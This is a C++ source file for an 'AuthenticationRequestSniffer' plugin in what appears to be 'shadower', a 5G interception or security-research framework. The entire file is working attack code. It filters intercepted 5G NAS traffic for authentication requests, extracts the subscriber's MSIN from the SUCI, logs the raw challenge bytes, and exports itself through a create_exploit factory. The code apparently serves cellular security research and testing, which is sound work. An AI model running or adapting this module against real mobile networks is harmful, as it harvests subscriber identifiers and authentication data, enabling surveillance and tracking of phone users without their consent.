#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

class AuthenticationRequestSniffer : public Exploit
{
public:
  AuthenticationRequestSniffer(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
  }

  void setup() override
  {
    f_authentication_request = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x56");
    filters.push_back(f_authentication_request);

    f_msin = ws_field_t::make_field_string("nas-5gs.mm.suci.msin");
    fields.push_back(f_msin);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (f_msin->has_string) {
      msin = f_msin->string_value;
    }

    if (f_authentication_request->match) {
      std::ostringstream oss;
      oss << "{";
      for (uint32_t i = 54; i < len; i++) {
        oss << "0x" << std::setfill('0') << std::setw(2) << std::hex << static_cast<int>(buffer[i]) << ", ";
      }
      oss << "};";
      logger.info("Received %s authentication request: %s", msin.c_str(), oss.str().c_str());
    }
  }

private:
  std::shared_ptr<ws_filter_t> f_authentication_request;
  std::shared_ptr<ws_field_t>  f_msin;
  std::string                  msin;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationRequestSniffer(dl_buffer_queue_, ul_buffer_queue_);
}
}